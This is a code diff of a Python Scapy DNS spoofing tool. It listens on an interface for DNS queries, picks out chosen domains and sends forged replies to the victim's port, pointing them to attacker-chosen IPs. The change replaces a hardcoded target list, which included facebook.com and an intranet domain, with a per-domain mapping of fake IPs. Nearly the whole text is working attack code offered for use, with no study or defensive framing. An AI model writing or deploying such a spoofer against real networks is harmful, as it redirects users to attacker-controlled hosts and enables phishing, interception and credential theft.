@@ -1,20 +1,15 @@
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
 
-# You can modify this list to spoof specific domains only
-TARGET_DOMAINS = [
-    "facebook.com",
-    "intranet.local",
-    "example.com"
-]
-
-def spoof_dns_packet(pkt, fake_ip, iface):
+def spoof_dns_packet(pkt, domain_ip_map, iface):
     if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
         try:
-            queried_domain = pkt[DNSQR].qname.decode().strip(".")
-            if TARGET_DOMAINS and queried_domain not in TARGET_DOMAINS:
-                print("[-] Ignored domain:", queried_domain)
+            queried_domain = pkt[DNSQR].qname.decode().strip(".").lower()
+
+            if queried_domain not in domain_ip_map:
+                print("[-] Ignored domain: {}".format(queried_domain))
                 return
 
+            fake_ip = domain_ip_map[queried_domain]
             victim_ip = pkt[IP].src
             victim_port = pkt[UDP].sport
             dns_id = pkt[DNS].id
@@ -47,7 +42,6 @@ def spoof_dns_packet(pkt, fake_ip, iface):
 
             spoofed_response = ip_layer / udp_layer / dns_layer
 
-            # Force recalculation of headers
             del spoofed_response[IP].len
             del spoofed_response[IP].chksum
             del spoofed_response[UDP].len
@@ -59,11 +53,12 @@ def spoof_dns_packet(pkt, fake_ip, iface):
         except Exception as e:
             print("[!] Error processing DNS packet: {}".format(e))
 
-def start_dns_spoofer(fake_ip, iface):
+def start_dns_spoofer(domain_ip_map, iface):
     print("[*] DNS spoofing started")
-    print("[*] Fake IP to inject: {}".format(fake_ip))
     print("[*] Listening on interface: {}".format(iface))
-    print("[*] Spoofing domains: {}".format(", ".join(TARGET_DOMAINS) if TARGET_DOMAINS else "All domains"))
+    print("[*] Spoofing targets:")
+    for domain, ip in domain_ip_map.items():
+        print("  - {} -> {}".format(domain, ip))
 
     conf.iface = iface
 
@@ -71,7 +66,7 @@ def start_dns_spoofer(fake_ip, iface):
         sniff(
             iface=iface,
             filter="udp port 53",
-            prn=lambda pkt: spoof_dns_packet(pkt, fake_ip, iface),
+            prn=lambda pkt: spoof_dns_packet(pkt, domain_ip_map, iface),
             store=False
         )
     except KeyboardInterrupt:
